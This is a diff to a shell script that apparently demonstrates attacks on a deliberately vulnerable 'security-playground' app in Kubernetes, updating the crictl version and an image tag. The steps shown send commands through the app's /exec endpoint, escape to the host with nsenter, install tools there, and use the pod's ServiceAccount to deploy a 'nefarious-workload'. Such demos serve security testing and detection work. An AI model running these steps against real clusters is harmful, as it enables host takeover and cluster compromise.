@@ -35,8 +35,8 @@ sleep 10
 echo "4. Break out of our Linux namespace to the host's with nsenter and install crictl in /usr/bin"
 echo "--------------------------------------------------------------------------------"
 ARCH=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=dpkg --print-architecture')
-curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-$ARCH.tar.gz"
-curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.27.1-linux-$ARCH.tar.gz -C /usr/bin"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin"
 echo "--------------------------------------------------------------------------------"
 sleep 10
 
@@ -65,7 +65,7 @@ echo "8. Call the Kubernetes API via security-playground's K8s ServiceAccount"
 echo "--------------------------------------------------------------------------------"
 curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.27.1/2023-04-19/bin/linux/$ARCH/kubectl"
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
-curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:270723'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:070124'
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
 echo "--------------------------------------------------------------------------------"
 sleep 10
